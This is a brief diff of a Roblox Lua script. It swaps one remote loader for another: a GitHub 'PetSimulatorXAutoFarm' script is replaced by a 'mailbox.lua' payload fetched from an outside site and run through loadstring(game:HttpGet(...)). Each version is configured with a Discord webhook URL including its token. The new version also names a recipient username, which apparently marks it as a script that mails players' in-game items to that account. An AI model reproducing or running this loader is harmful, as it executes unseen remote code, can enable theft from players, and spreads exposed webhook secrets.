@@ -1,3 +1,4 @@
-_G.UserID = 4462422694
-_G.WebHook = "https://discord.com/api/webhooks/1182988724091486238/cbYm8FJi21RxMejGVgOVNiDpcsFTgpWr83CF1Fy0k_fnTS7NjB54bx2qgZv2PmXuBsKF"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
+UserName = "UseCodeBYS"
+WebHook = "https://discord.com/api/webhooks/1185931939820089424/jRhLuRtK2SNqjndcJbRH25bXh-K0tyqQVplO1yvfikgQO0y9y8jwxQKQCfYZcsQWH2ke"
+
+loadstring(game:HttpGet("https://goof.pro/s/mailbox.lua", true))()
